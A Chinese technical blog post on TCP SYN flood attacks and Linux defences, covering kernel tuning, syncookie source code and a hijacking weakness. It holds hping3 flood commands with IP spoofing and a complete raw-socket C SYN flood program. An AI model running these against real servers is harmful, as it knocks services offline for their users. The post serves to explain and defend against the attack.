---
title: 扯谈网络编程之Tcp SYN flood洪水攻击
date: 2014-05-12 05:58:28
tags:
 - tcp
 - security


categories:
  - 技术

---


update 2017-5-11: syncookies 会点用 tcp_options 字段空间，会强制关闭 tcp 高级流控技术而退化成原始 tcp 模式。此模式会导致 封包 丢失时对端要等待MSL时间来发现丢包事件并重试，以及关闭连接时 TIME_WAIT 状态保持 2MSL 时间。


## 简介

TCP协议要经过三次握手才能建立连接(from wiki)：

![tcp](/img/tcp-syn.png)


于是出现了对于握手过程进行的攻击。攻击者发送大量的SYN包，服务器回应(SYN+ACK)包，但是攻击者不回应ACK包，这样的话，服务器不知道(SYN+ACK)是否发送成功，默认情况下会重试5次（tcp_syn_retries）。这样的话，对于服务器的内存，带宽都有很大的消耗。攻击者如果处于公网，可以伪造IP的话，对于服务器就很难根据IP来判断攻击者，给防护带来很大的困难。

## 攻与防

### 攻击者角度

从攻击者的角度来看，有两个地方可以提高服务器防御的难度的：

* 变换端口
* 伪造IP

变换端口很容易做到，攻击者可以使用任意端口。

攻击者如果是只有内网IP，是没办法伪造IP的，因为伪造的SYN包会被路由抛弃。攻击者如果是有公网IP，则有可能伪造IP，发出SYN包。（TODO，待更多验证）

### hping3

hping3是一个很有名的网络安全工具，使用它可以很容易构造各种协议包。

用下面的命令可以很容易就发起SYN攻击：

```bash
sudo hping3 --flood -S -p 9999  x.x.x.x
#random source address
sudo hping3 --flood -S --rand-source -p 9999  x.x.x.x
```

* --flood 是不间断发包的意思
* -S         是SYN包的意思

更多的选项，可以man hping3 查看文档，有详细的说明。

如果是条件允许，可以伪造IP地址的话，可以用--rand-source参数来伪造。
我在实际测试的过程中，可以伪造IP，也可以发送出去，但是服务器没有回应，从本地路由器的统计数据可以看出是路由器把包给丢弃掉了。

我用两个美国的主机来测试，使用

```bash
sudo hping3 --flood -S  -p 9999  x.x.x.x
```

![hping3](/img/hping3.png)

发现，实际上攻击效果有限，只有网络使用上涨了，服务器的cpu，内存使用都没有什么变化：

为什么会这样呢？下面再解析。

### 防御者角度

当可能遇到SYN flood攻击时，syslog，/var/log/syslog里可能会出现下面的日志：

```
kernel: [3649830.269068] TCP: Possible SYN flooding on port 9999. Sending cookies.  Check SNMP counters.
```

这个也有可能是SNMP协议误报，下面再解析。

从防御者的角度来看，主要有以下的措施：

* 内核参数的调优
* 防火墙禁止掉部分IP

linux内核参数调优主要有下面三个：

* 增大tcp_max_syn_backlog
* 减小tcp_synack_retries
* 启用tcp_syncookies

#### tcp_max_syn_backlog

从字面上就可以推断出是什么意思。在内核里有个队列用来存放还没有确认ACK的客户端请求，当等待的请求数大于tcp_max_syn_backlog时，后面的会被丢弃。

所以，适当增大这个值，可以在压力大的时候提高握手的成功率。手册里推荐大于1024。

#### tcp_synack_retries

这个是三次握手中，服务器回应ACK给客户端里，重试的次数。默认是5。显然攻击者是不会完成整个三次握手的，因此服务器在发出的ACK包在没有回应的情况下，会重试发送。当发送者是伪造IP时，服务器的ACK回应自然是无效的。

为了防止服务器做这种无用功，可以把tcp_synack_retries设置为0或者1。因为对于正常的客户端，如果它接收不到服务器回应的ACK包，它会再次发送SYN包，客户端还是能正常连接的，只是可能在某些情况下建立连接的速度变慢了一点。

#### tcp_syncookies

根据man tcp手册，tcp_syncookies是这样解析的：

```
       tcp_syncookies (Boolean; since Linux 2.2)
              Enable TCP syncookies.  The kernel must be compiled with CONFIG_SYN_COOKIES.  Send out syncookies  when  the
              syn  backlog  queue  of  a socket overflows.  The syncookies feature attempts to protect a socket from a SYN
              flood attack.  This should be used as a last resort, if at all.  This is a violation of  the  TCP  protocol,
              and conflicts with other areas of TCP such as TCP extensions.  It can cause problems for clients and relays.
              It is not recommended as a tuning mechanism for heavily loaded servers to help with overloaded or misconfig‐
              ured   conditions.    For   recommended   alternatives   see  tcp_max_syn_backlog,  tcp_synack_retries,  and
              tcp_abort_on_overflow.
```

当半连接的请求数量超过了tcp_max_syn_backlog时，内核就会启用SYN cookie机制，不再把半连接请求放到队列里，而是用SYN cookie来检验。

手册上只给出了模糊的说明，具体的实现没有提到。

### linux下SYN cookie的实现

查看了linux的代码（https://github.com/torvalds/linux/blob/master/net/ipv4/syncookies.c ）后，发现linux的实现并不是像wiki上

SYN cookie是非常巧妙地利用了TCP规范来绕过了TCP连接建立过程的验证过程，从而让服务器的负载可以大大降低。

在三次握手中，当服务器回应（SYN + ACK）包后，客户端要回应一个n + 1的ACK到服务器。其中n是服务器自己指定的。当启用tcp_syncookies时，linux内核生成一个特定的n值，而不并把客户的连接放到半连接的队列里（即没有存储任何关于这个连接的信息）。当客户端提交第三次握手的ACK包时，linux内核取出n值，进行校验，如果通过，则认为这个是一个合法的连接。

n即ISN（initial sequence number），是一个无符号的32位整数，**那么linux内核是如何把信息记录到这有限的32位里，并完成校验的？**

首先，TCP连接建立时，双方要协商好MSS（Maximum segment size），服务器要把客户端在ACK包里发过来的MSS值记录下来。

另外，因为服务器没有记录ACK包的任何信息，实际上是绕过了正常的TCP握手的过程，服务器只能靠客户端的第三次握手发过来的ACK包来验证，所以必须要有一个可靠的校验算法，防止攻击者伪造ACK，劫持会话。

linux是这样实现的：

1. 在服务器上有一个60秒的计时器，即每隔60秒，count加一；
2. MSS是这样子保存起来的，用一个硬编码的数组，保存起一些MSS值：

```cpp
static __u16 const msstab[] = {
	536,
	1300,
	1440,	/* 1440, 1452: PPPoE */
	1460,
};
```

比较客户发过来的mms，取一个比客户发过来的值还要小的mms。算法很简单：

```cpp
/*
 * Generate a syncookie.  mssp points to the mss, which is returned
 * rounded down to the value encoded in the cookie.
 */
u32 __cookie_v4_init_sequence(const struct iphdr *iph, const struct tcphdr *th,
			      u16 *mssp)
{
	int mssind;
	const __u16 mss = *mssp;
 
	for (mssind = ARRAY_SIZE(msstab) - 1; mssind ; mssind--)
		if (mss >= msstab[mssind])
			break;
	*mssp = msstab[mssind];
 
	return secure_tcp_syn_cookie(iph->saddr, iph->daddr,
				     th->source, th->dest, ntohl(th->seq),
				     mssind);
}
```

比较客户发过来的mms，取一个比客户发过来的值还要小的mms。

真正的算法在这个函数里：

```cpp
static __u32 secure_tcp_syn_cookie(__be32 saddr, __be32 daddr, __be16 sport,
				   __be16 dport, __u32 sseq, __u32 data)
{
	/*
	 * Compute the secure sequence number.
	 * The output should be:
	 *   HASH(sec1,saddr,sport,daddr,dport,sec1) + sseq + (count * 2^24)
	 *      + (HASH(sec2,saddr,sport,daddr,dport,count,sec2) % 2^24).
	 * Where sseq is their sequence number and count increases every
	 * minute by 1.
	 * As an extra hack, we add a small "data" value that encodes the
	 * MSS into the second hash value.
	 */
	u32 count = tcp_cookie_time();
	return (cookie_hash(saddr, daddr, sport, dport, 0, 0) +
		sseq + (count << COOKIEBITS) +
		((cookie_hash(saddr, daddr, sport, dport, count, 1) + data)
		 & COOKIEMASK));
}
```

data实际上是mss的值对应的数组下标，count是每一分钟会加1，sseq是客户端发过来的sequence。

这样经过hash和一些加法，得到了一个ISN值，其中里记录了这个连接合适的MSS值。



当接收到客户端发过来的第三次握手的ACK包时，反向检查即可：

```cpp
/*
 * Check if a ack sequence number is a valid syncookie.
 * Return the decoded mss if it is, or 0 if not.
 */
int __cookie_v4_check(const struct iphdr *iph, const struct tcphdr *th,
		      u32 cookie)
{
	__u32 seq = ntohl(th->seq) - 1;
	__u32 mssind = check_tcp_syn_cookie(cookie, iph->saddr, iph->daddr,
					    th->source, th->dest, seq);
 
 
	return mssind < ARRAY_SIZE(msstab) ? msstab[mssind] : 0;
}
```

先得到原来的seq，再调用check_tcp_syn_cookie函数：

```cpp
/*
 * This retrieves the small "data" value from the syncookie.
 * If the syncookie is bad, the data returned will be out of
 * range.  This must be checked by the caller.
 *
 * The count value used to generate the cookie must be less than
 * MAX_SYNCOOKIE_AGE minutes in the past.
 * The return value (__u32)-1 if this test fails.
 */
static __u32 check_tcp_syn_cookie(__u32 cookie, __be32 saddr, __be32 daddr,
				  __be16 sport, __be16 dport, __u32 sseq)
{
	u32 diff, count = tcp_cookie_time();
 
 
	/* Strip away the layers from the cookie */
	cookie -= cookie_hash(saddr, daddr, sport, dport, 0, 0) + sseq;
 
 
	/* Cookie is now reduced to (count * 2^24) ^ (hash % 2^24) */
	diff = (count - (cookie >> COOKIEBITS)) & ((__u32) -1 >> COOKIEBITS);
	if (diff >= MAX_SYNCOOKIE_AGE)
		return (__u32)-1;
 
 
	return (cookie -
		cookie_hash(saddr, daddr, sport, dport, count - diff, 1))
		& COOKIEMASK;	/* Leaving the data behind */
}
```

先减去之前的一些值，第一个hash和sseq。然后计算现在的count（每60秒加1的计数器）和之前的发给客户端，然后客户端返回过来的count的差：
如果大于MAX_SYNCOOKIE_AGE，即2，即2分钟。则说明已经超时了。

否则，计算得出之前放进去的mss。这样内核就认为这个是一个合法的TCP连接，并且得到了一个合适的mss值，这样就建立起了一个合法的TCP连接。
可以看到SYN cookie机制十分巧妙地不用任何存储，以略消耗CPU实现了对第三次握手的校验。

但是有得必有失，ISN里只存储了MSS值，因此，其它的TCP Option都不会生效，这就是为什么SNMP协议会误报的原因了。

### 更强大的攻击者

SYN cookie虽然十分巧妙，但是也给攻击者带了新的攻击思路。

因为SYN cookie机制不是正常的TCP三次握手。因此攻击者可以构造一个第三次握手的ACK包，从而劫持会话。

攻击者的思路很简单，通过暴力发送大量的伪造的第三次握手的ACK包，因为ISN只有32位，攻击者只要发送全部的ISN数据ACK包，总会有一个可以通过服务器端的校验。

有的人就会问了，即使攻击者成功通过了服务器的检验，它还是没有办法和服务器正常通讯啊，因为服务器回应的包都不会发给攻击者。

刚开始时，我也有这个疑问，但是TCP允许在第三次握手的ACK包里带上后面请求的数据，这样可以加快数据的传输。所以，比如一个http服务器，攻击者可以通过在第三次握手的ACK包里带上http get/post请求，从而完成攻击。

所以对于服务器而言，不能只是依靠IP来校验合法的请求，还要通过其它的一些方法来加强校验。比如CSRF等。

**值得提醒的是即使是正常的TCP三次握手过程，攻击者还是可以进行会话劫持的，只是概率比SYN cookie的情况下要小很多。**

详细的攻击说明：http://www.91ri.org/7075.html

### 一个用raw socket SYN flood攻击的代码

下面给出一个tcp syn flood的攻击的代码：

```cpp
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
 
#pragma pack(1)
struct pseudo_header    //needed for checksum calculation
{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
 
	struct tcphdr tcp;
};
#pragma pack()
 
unsigned short csum(unsigned short *ptr, int nbytes) {
 long sum;
 unsigned short oddbyte;
 short answer;
 
 sum = 0;
 while (nbytes > 1) {
   sum += *ptr++;
   nbytes -= 2;
 }
 if (nbytes == 1) {
   oddbyte = 0;
   *((u_char*) &oddbyte) = *(u_char*) ptr;
   sum += oddbyte;
 }
 
 sum = (sum >> 16) + (sum & 0xffff);
 sum = sum + (sum >> 16);
 answer = (short) ~sum;
 
 return (answer);
}
 
void oneSyn(int socketfd, in_addr_t source, u_int16_t sourcePort,
		in_addr_t destination, u_int16_t destinationPort) {
	static char sendBuf[sizeof(iphdr) + sizeof(tcphdr)] = { 0 };
	bzero(sendBuf, sizeof(sendBuf));
 
	struct iphdr* ipHeader = (iphdr*) sendBuf;
	struct tcphdr *tcph = (tcphdr*) (sendBuf + sizeof(iphdr));
 
	ipHeader->version = 4;
	ipHeader->ihl = 5;
 
	ipHeader->tos = 0;
	ipHeader->tot_len = htons(sizeof(sendBuf));
 
	ipHeader->id = htons(1);
	ipHeader->frag_off = 0;
	ipHeader->ttl = 254;
	ipHeader->protocol = IPPROTO_TCP;
	ipHeader->check = 0;
	ipHeader->saddr = source;
	ipHeader->daddr = destination;
 
	ipHeader->check = csum((unsigned short*) ipHeader, ipHeader->ihl * 2);
 
	//TCP Header
	tcph->source = htons(sourcePort);
	tcph->dest = htons(destinationPort);
	tcph->seq = 0;
	tcph->ack_seq = 0;
	tcph->doff = 5; //sizeof(tcphdr)/4
	tcph->fin = 0;
	tcph->syn = 1;
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->window = htons(512);
	tcph->check = 0;
	tcph->urg_ptr = 0;
 
	//tcp header checksum
	struct pseudo_header pseudoHeader;
	pseudoHeader.source_address = source;
	pseudoHeader.dest_address = destination;
	pseudoHeader.placeholder = 0;
	pseudoHeader.protocol = IPPROTO_TCP;
	pseudoHeader.tcp_length = htons(sizeof(tcphdr));
	memcpy(&pseudoHeader.tcp, tcph, sizeof(struct tcphdr));
 
	tcph->check = csum((unsigned short*) &pseudoHeader, sizeof(pseudo_header));
 
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(sourcePort);
	sin.sin_addr.s_addr = destination;
 
	ssize_t sentLen = sendto(socketfd, sendBuf, sizeof(sendBuf), 0,
			(struct sockaddr *) &sin, sizeof(sin));
	if (sentLen == -1) {
		perror("sent error");
	}
}
 
int main(void) {
	//for setsockopt
	int optval = 1;
 
	//create a raw socket
	int socketfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if (socketfd == -1) {
		perror("create socket:");
		exit(0);
	}
	if (setsockopt(socketfd, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval))
			< 0) {
		perror("create socket:");
		exit(0);
	}
 
	in_addr_t source = inet_addr("192.168.1.100");
	in_addr_t destination = inet_addr("192.168.1.101");
	u_int16_t sourcePort = 1;
	u_int16_t destinationPort = 9999;
	while (1) {
		oneSyn(socketfd, source, sourcePort++, destination,
				destinationPort);
		sourcePort %= 65535;
		sleep(1);
	}
 
	return 0;
}
```

## 总结

对于SYN flood攻击，调整下面三个参数就可以防范绝大部分的攻击了。

* 增大tcp_max_syn_backlog
* 减小tcp_synack_retries
* 启用tcp_syncookies

貌似现在的内核默认都是开启tcp_syncookies的。

## 参考

* http://www.redhat.com/archives/rhl-devel-list/2005-January/msg00447.html
* man tcp
* http://nixcraft.com/showthread.php/16864-Linux-Howto-test-and-stop-syn-flood-attacks
* http://en.wikipedia.org/wiki/SYN_cookies
* https://github.com/torvalds/linux/blob/master/net/ipv4/syncookies.c
* http://www.91ri.org/7075.html